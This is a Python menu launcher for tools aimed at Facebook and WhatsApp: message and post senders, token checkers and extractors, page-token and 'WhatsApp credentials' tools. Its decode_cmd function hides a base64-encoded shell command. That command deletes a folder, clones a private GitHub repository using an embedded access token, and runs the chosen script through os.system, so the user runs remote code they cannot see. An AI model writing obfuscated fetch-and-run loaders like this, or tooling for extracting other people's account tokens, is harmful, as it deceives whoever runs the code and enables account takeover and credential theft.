import os
import base64
from colorama import init, Fore, Style

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

logo = f'''
{Fore.CYAN}{Style.BRIGHT}
 ██████╗ ███████╗███████╗██╗     ██╗███╗   ██╗███████╗
██╔═══██╗██╔════╝██╔════╝██║     ██║████╗  ██║██╔════╝
██║   ██║█████╗  █████╗  ██║     ██║██╔██╗ ██║█████╗  
██║   ██║██╔══╝  ██╔══╝  ██║     ██║██║╚██╗██║██╔══╝  
╚██████╔╝██║     ██║     ███████╗██║██║ ╚████║███████╗
 ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
{Style.RESET_ALL}
'''

def print_menu():
    print(f"{Fore.YELLOW}{Style.BRIGHT} ┌─────────────────────────────┐")
    print(f" │        SELECT OPTION        │")
    print(f" ├─────────────────────────────┤")
    print(f" │ 01. POST                    │")
    print(f" │ 02. CONVO                   │")
    print(f" │ 03. WATTSAPP                │")
    print(f" │ 04. TOKEN CHECKER           │")
    print(f" │ 05. TOKEN EXTRACTOR         │")
    print(f" │ 06. FACEBOOK POST ID        │")
    print(f" │ 07. WATTSAPP GROUP ID       │")
    print(f" │ 08. MESSENGER CONVO ID      │")
    print(f" │ 09. PAGE TOKEN EXTRACTOR    │")
    print(f" │ 10. WATTSAPP CREDENTIALS    │")
    print(f" └─────────────────────────────┘{Style.RESET_ALL}")

def decode_cmd():
    encoded = b'cm0gLXJmIFRFUk1VWC1PRkZMSU5FICYmIGdpdCBjbG9uZSBodHRwczovL29hdXRoMjpnaHBfUUZQclpRU1ZUdjkzSFZVMDVWQ1o4eEpoNGhpTHA5Mk1lRlZlQEdpdEh1Yi5jb20vRlNPM1k5TlNVQTlRMFFCV1lTSVc2MzlKREI3UUpXSVM3ODlJSEovVEVSTVVYLU9GRkxJTkUuZ2l0ICYmIGNkIFRFUk1VWC1PRkZMSU5FICYmIA=='
    return base64.b64decode(encoded).decode()

def run_command(option):
    base_cmd = decode_cmd()

    commands = {
        "1": base_cmd + "python post.py",
        "2": base_cmd + "python convo.py",
        "3": base_cmd + "python wattsapp.py",
        "4": base_cmd + "python token_checker.py",
        "5": base_cmd + "python token_extractor.py",
        "6": base_cmd + "python post_id.py",
        "7": base_cmd + "npm install && node wp_group_id.js",
        "8": base_cmd + "python convo_id.py",
        "9": base_cmd + "python page_token.py",
        "10": base_cmd + "npm install && node wp_creds.js"
    }

    cmd = commands.get(option)
    if not cmd:
        print(f"{Fore.RED}Invalid option. Please try again.")
        return

    print(f"{Fore.GREEN}Running selected option...{Style.RESET_ALL}")
    os.system(cmd)

if __name__ == "__main__":
    clear_screen()
    print(logo)
    print_menu()
    choice = input(f"\n{Fore.GREEN} Select an option (1-10): {Style.RESET_ALL}").strip()
    run_command(choice)
